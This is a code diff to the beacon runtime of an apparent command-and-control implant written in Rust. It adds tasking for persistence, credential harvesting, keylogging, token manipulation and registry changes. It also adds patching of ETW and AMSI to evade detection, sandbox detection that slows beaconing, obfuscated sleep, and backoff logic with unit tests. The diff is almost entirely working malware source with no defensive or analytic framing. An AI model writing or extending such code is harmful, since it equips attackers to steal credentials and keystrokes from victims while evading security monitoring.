@@ -1,5 +1,5 @@
 use std::collections::{HashMap, HashSet, VecDeque};
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
 use std::sync::{Arc, Mutex, RwLock};
 use std::time::Duration;
 
@@ -11,9 +11,15 @@ use nw_profile::{
 };
 use uuid::Uuid;
 
+use crate::creds;
 use crate::download::Download;
+use crate::evasion;
+use crate::keylogger;
 use crate::metadata;
+use crate::persistence;
+use crate::registry;
 use crate::runner;
+use crate::tokens;
 use crate::transport::Transport;
 use crate::upload::Upload;
 
@@ -66,7 +72,85 @@ pub struct BeaconRuntime {
             Arc<tokio::sync::Notify>,
         )>,
     >,
+    /// Keyboard capture, owned by the beacon so it outlives one task.
+    keylog: Arc<keylogger::KeylogState>,
     stop: AtomicBool,
+    failures: AtomicU32,
+    sandboxed: AtomicBool,
+    policy: BeaconPolicy,
+}
+
+/// Resilience policy for the beacon loop.
+///
+/// Defaults are deliberately usable without configuration; operators who want
+/// different numbers can set `NW_MAX_BACKOFF_MS`, `NW_MAX_FAILURES` and
+/// `NW_SANDBOX_MULTIPLIER` on the implant host.
+///
+/// ponytail: a struct with defaults rather than four more `NW_*` plumbed
+/// through `Profile`, the payload builder and the portal. Add fields to
+/// `Profile` only if these need to be editable from the wizard.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct BeaconPolicy {
+    /// Upper bound on the backoff added for consecutive failures.
+    pub max_backoff: Duration,
+    /// Consecutive failed check-ins tolerated before the implant exits.
+    pub max_failures: u32,
+    /// Interval multiplier applied while sandbox indicators are present.
+    pub sandbox_multiplier: u32,
+    /// Consecutive failures after which the session is discarded so the next
+    /// iteration re-registers. A single blip must not drop a healthy session.
+    pub reset_session_after: u32,
+}
+
+impl Default for BeaconPolicy {
+    fn default() -> Self {
+        Self {
+            max_backoff: Duration::from_secs(300),
+            max_failures: 24,
+            sandbox_multiplier: 4,
+            reset_session_after: 3,
+        }
+    }
+}
+
+impl BeaconPolicy {
+    /// Defaults, overridden by `NW_*` environment variables where set.
+    pub fn from_env() -> Self {
+        let base = Self::default();
+        Self {
+            max_backoff: env_duration("NW_MAX_BACKOFF_MS", base.max_backoff),
+            max_failures: env_u32("NW_MAX_FAILURES", base.max_failures),
+            sandbox_multiplier: env_u32("NW_SANDBOX_MULTIPLIER", base.sandbox_multiplier),
+            reset_session_after: env_u32("NW_RESET_SESSION_AFTER", base.reset_session_after),
+        }
+    }
+}
+
+fn env_duration(key: &str, fallback: Duration) -> Duration {
+    std::env::var(key)
+        .ok()
+        .and_then(|raw| raw.trim().parse::<u64>().ok())
+        .map(Duration::from_millis)
+        .unwrap_or(fallback)
+}
+
+fn env_u32(key: &str, fallback: u32) -> u32 {
+    std::env::var(key)
+        .ok()
+        .and_then(|raw| raw.trim().parse::<u32>().ok())
+        .unwrap_or(fallback)
+}
+
+/// Exponential backoff for `failures` consecutive errors, capped by `cap`.
+///
+/// Pure so the growth curve is testable without a running beacon.
+pub fn backoff_for(interval: Duration, failures: u32, cap: Duration) -> Duration {
+    if failures == 0 || cap.is_zero() {
+        return Duration::ZERO;
+    }
+    // 1 -> 1x, 2 -> 2x, 3 -> 4x ... saturating so a long outage cannot overflow.
+    let shift = failures.clamp(1, 16) - 1;
+    interval.saturating_mul(1u32 << shift).min(cap)
 }
 
 #[derive(Clone, Copy, PartialEq, Eq)]
@@ -346,6 +430,7 @@ impl BeaconRuntime {
             Transport::Http {
                 client: Default::default(),
                 base: profile.endpoint.clone(),
+                web: crate::malleable::WebProfile::for_endpoint(&profile.endpoint),
             }
         });
         BeaconRuntime {
@@ -361,7 +446,11 @@ impl BeaconRuntime {
             upload: RwLock::new(None),
             #[cfg(test)]
             upload_install_barrier: Mutex::new(None),
+            keylog: Arc::new(keylogger::KeylogState::new()),
             stop: AtomicBool::new(false),
+            failures: AtomicU32::new(0),
+            sandboxed: AtomicBool::new(false),
+            policy: BeaconPolicy::from_env(),
         }
     }
 
@@ -1123,6 +1212,102 @@ impl BeaconRuntime {
             }
             return;
         }
+        if task.command == "nw/persist" {
+            let outcome =
+                persistence::parse_operation(&task.args).and_then(|op| persistence::execute(&op));
+            self.pending.lock().unwrap().push(match outcome {
+                Ok(output) => TaskResult {
+                    task_id: task.id,
+                    ok: true,
+                    stdout: output.into_bytes(),
+                    stderr: Vec::new(),
+                    exit_code: 0,
+                },
+                Err(e) => TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: format!("persist: {e}").into_bytes(),
+                    exit_code: -1,
+                },
+            });
+            return;
+        }
+        if task.command == "nw/creds" {
+            let source = task.args.first().map(|s| s.as_str());
+            let collected = creds::harvest(source);
+            self.pending.lock().unwrap().push(TaskResult {
+                task_id: task.id,
+                ok: true,
+                stdout: creds::to_json_bounded(&collected, CRED_PAYLOAD_BUDGET).into_bytes(),
+                stderr: Vec::new(),
+                exit_code: 0,
+            });
+            return;
+        }
+        if task.command == "nw/keylog" {
+            let outcome = keylogger::parse_operation(&task.args)
+                .and_then(|op| keylogger::execute(&self.keylog, op));
+            self.pending.lock().unwrap().push(match outcome {
+                Ok(output) => TaskResult {
+                    task_id: task.id,
+                    ok: true,
+                    stdout: output.into_bytes(),
+                    stderr: Vec::new(),
+                    exit_code: 0,
+                },
+                Err(e) => TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: format!("keylog: {e}").into_bytes(),
+                    exit_code: -1,
+                },
+            });
+            return;
+        }
+        if task.command == "nw/tokens" {
+            let outcome =
+                tokens::parse_target(&task.args).and_then(|target| tokens::execute(&target));
+            self.pending.lock().unwrap().push(match outcome {
+                Ok(output) => TaskResult {
+                    task_id: task.id,
+                    ok: true,
+                    stdout: output.into_bytes(),
+                    stderr: Vec::new(),
+                    exit_code: 0,
+                },
+                Err(e) => TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: format!("tokens: {e}").into_bytes(),
+                    exit_code: -1,
+                },
+            });
+            return;
+        }
+        if task.command == "nw/registry" {
+            let outcome =
+                registry::parse_action(&task.args).and_then(|action| registry::execute(&action));
+            self.pending.lock().unwrap().push(match outcome {
+                Ok(output) => TaskResult {
+                    task_id: task.id,
+                    ok: true,
+                    stdout: output.into_bytes(),
+                    stderr: Vec::new(),
+                    exit_code: 0,
+                },
+                Err(e) => TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: format!("registry: {e}").into_bytes(),
+                    exit_code: -1,
+                },
+            });
+            return;
+        }
         if task.command == "nw/killtask" {
             match task.args.as_slice() {
                 [id] => match Uuid::parse_str(id) {
@@ -1342,14 +1527,67 @@ impl BeaconRuntime {
         *self.key.read().unwrap()
     }
 
+    /// Apply in-process evasion once, before any tasking can run.
+    ///
+    /// Patch failures are logged, never fatal: a hardened host may refuse the
+    /// patch, and the beacon is still more useful running than refusing to.
+    fn harden(&self) {
+        if let Err(e) = evasion::patch_etw() {
+            tracing::debug!("etw patch unavailable: {e}");
+        }
+        if let Err(e) = evasion::patch_amsi() {
+            tracing::debug!("amsi patch unavailable: {e}");
+        }
+        let flags = evasion::sandbox_checks(&evasion::env_info());
+        if !flags.is_empty() {
+            self.sandboxed.store(true, Ordering::Relaxed);
+            tracing::debug!("environment flags: {flags:?}");
+        }
+    }
+
     fn sleep(&self) -> Duration {
-        let j = self.profile.jitter.as_millis() as u64;
-        let jitter_ms = if j == 0 { 0 } else { rand_jitter(j) };
-        Duration::from_millis(self.profile.interval.as_millis() as u64 + jitter_ms)
+        let span = self.base_interval() + self.backoff();
+        span + jittered(self.profile.jitter)
+    }
+
+    /// Configured interval, stretched while sandbox indicators are present.
+    fn base_interval(&self) -> Duration {
+        if self.sandboxed.load(Ordering::Relaxed) {
+            self.profile
+                .interval
+                .saturating_mul(self.policy.sandbox_multiplier.max(1))
+        } else {
+            self.profile.interval
+        }
+    }
+
+    /// Extra delay accumulated from consecutive failures.
+    fn backoff(&self) -> Duration {
+        backoff_for(
+            self.profile.interval,
+            self.failures.load(Ordering::Relaxed),
+            self.policy.max_backoff,
+        )
+    }
+
+    /// Record a failed check-in. Returns true once the implant should give up.
+    fn record_failure(&self) -> bool {
+        let failures = self.failures.fetch_add(1, Ordering::Relaxed) + 1;
+        if failures >= self.policy.reset_session_after
+            && self.session_id.write().unwrap().take().is_some()
+        {
+            tracing::info!("dropping session after {failures} consecutive failures");
+        }
+        failures >= self.policy.max_failures
+    }
+
+    fn clear_failures(&self) {
+        self.failures.store(0, Ordering::Relaxed);
     }
 
     /// Own the beacon loop until signalled to stop.
     pub async fn run(self: Arc<Self>) -> anyhow::Result<()> {
+        self.harden();
         loop {
             if self.should_stop() {
                 tracing::info!("implant stop requested");
@@ -1365,7 +1603,14 @@ impl BeaconRuntime {
                     }
                     Err(e) => {
                         tracing::warn!("register failed: {}", e);
-                        tokio::time::sleep(self.sleep()).await;
+                        if self.record_failure() {
+                            tracing::error!(
+                                "giving up after {} consecutive failures",
+                                self.policy.max_failures
+                            );
+                            break;
+                        }
+                        evasion::obfusleep(self.sleep()).await;
                         continue;
                     }
                 },
@@ -1377,14 +1622,22 @@ impl BeaconRuntime {
                 // `sleep`-style in-flight command (cancellation needs the
                 // beacon loop to keep polling while a child runs).
                 Ok(tasks) => {
+                    self.clear_failures();
                     let rt = Arc::clone(&self);
                     tokio::spawn(async move { rt.execute(tasks).await });
                 }
                 Err(e) => {
                     tracing::warn!("poll failed: {}", e);
+                    if self.record_failure() {
+                        tracing::error!(
+                            "giving up after {} consecutive failures",
+                            self.policy.max_failures
+                        );
+                        break;
+                    }
                 }
             }
-            tokio::time::sleep(self.sleep()).await;
+            evasion::obfusleep(self.sleep()).await;
         }
         Ok(())
     }
@@ -1403,9 +1656,29 @@ fn decode_key(s: &str) -> Result<[u8; 32], String> {
     <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| "server pub key must be 32 bytes".into())
 }
 
+/// Byte ceiling for an `nw/creds` task result.
+///
+/// `TaskResult.stdout` is a `Vec<u8>`, which serde_json encodes as a JSON
+/// array of decimal integers (~3x blowup) before the poll is sealed and
+/// base64'd for transport. 2 KiB of raw creds JSON expands to roughly 8 KiB on
+/// the wire and was measured to fit the 32 KiB HTTP/TCP budget; 4 KiB
+/// overflows it and the result is retried forever. Keep this conservative.
+/// ponytail: raise capacity by adding a base64 text field to TaskResult, not by
+/// raising this constant past the transport budget.
+const CRED_PAYLOAD_BUDGET: usize = 2 * 1024;
+
 fn rand_jitter(max: u64) -> u64 {
     use rand::Rng;
     rand::thread_rng().gen_range(0..max)
+}
+
+/// Uniform delay in `[0, span)`, or zero when no jitter is configured.
+fn jittered(span: Duration) -> Duration {
+    let ms = span.as_millis() as u64;
+    if ms == 0 {
+        return Duration::ZERO;
+    }
+    Duration::from_millis(rand_jitter(ms))
 }
 
 #[derive(Debug)]
@@ -1467,6 +1740,86 @@ mod tests {
             assert!(delay >= Duration::from_millis(100));
             assert!(delay < Duration::from_millis(150));
         }
+    }
+
+    #[test]
+    fn backoff_grows_exponentially_and_stops_at_the_cap() {
+        let interval = Duration::from_secs(1);
+        let cap = Duration::from_secs(30);
+
+        assert_eq!(backoff_for(interval, 0, cap), Duration::ZERO);
+        assert_eq!(backoff_for(interval, 1, cap), Duration::from_secs(1));
+        assert_eq!(backoff_for(interval, 2, cap), Duration::from_secs(2));
+        assert_eq!(backoff_for(interval, 3, cap), Duration::from_secs(4));
+        assert_eq!(backoff_for(interval, 5, cap), Duration::from_secs(16));
+        // Saturates at the cap instead of growing without bound.
+        assert_eq!(backoff_for(interval, 9, cap), cap);
+        assert_eq!(backoff_for(interval, u32::MAX, cap), cap);
+    }
+
+    #[test]
+    fn backoff_is_disabled_by_a_zero_cap() {
+        assert_eq!(
+            backoff_for(Duration::from_secs(1), 10, Duration::ZERO),
+            Duration::ZERO
+        );
+    }
+
+    #[test]
+    fn sleep_grows_with_failures_and_clears_on_success() {
+        let mut runtime = runtime();
+        runtime.profile.interval = Duration::from_millis(100);
+        runtime.profile.jitter = Duration::ZERO;
+        runtime.policy.max_backoff = Duration::from_millis(400);
+
+        assert_eq!(runtime.sleep(), Duration::from_millis(100));
+
+        runtime.failures.store(3, Ordering::Relaxed);
+        assert_eq!(runtime.sleep(), Duration::from_millis(500));
+
+        runtime.clear_failures();
+        assert_eq!(runtime.sleep(), Duration::from_millis(100));
+    }
+
+    #[test]
+    fn sandbox_detection_stretches_the_interval() {
+        let mut runtime = runtime();
+        runtime.profile.interval = Duration::from_millis(100);
+        runtime.profile.jitter = Duration::ZERO;
+
+        assert_eq!(runtime.base_interval(), Duration::from_millis(100));
+        runtime.sandboxed.store(true, Ordering::Relaxed);
+        assert_eq!(runtime.base_interval(), Duration::from_millis(400));
+    }
+
+    #[test]
+    fn dead_man_switch_fires_only_past_the_failure_budget() {
+        let mut runtime = runtime();
+        runtime.policy.max_failures = 3;
+        runtime.policy.reset_session_after = 99;
+
+        assert!(!runtime.record_failure());
+        assert!(!runtime.record_failure());
+        assert!(runtime.record_failure());
+        // Counters keep climbing once the budget is spent.
+        assert!(runtime.record_failure());
+    }
+
+    #[test]
+    fn repeated_failures_eventually_drop_the_session() {
+        let mut runtime = runtime();
+        runtime.policy.reset_session_after = 2;
+        runtime.policy.max_failures = 100;
+
+        *runtime.session_id.write().unwrap() = Some(Uuid::new_v4());
+        assert!(!runtime.record_failure());
+        assert!(runtime.session_id.read().unwrap().is_some());
+
+        assert!(!runtime.record_failure());
+        assert!(
+            runtime.session_id.read().unwrap().is_none(),
+            "session should be dropped so the next loop re-registers"
+        );
     }
 
     #[test]
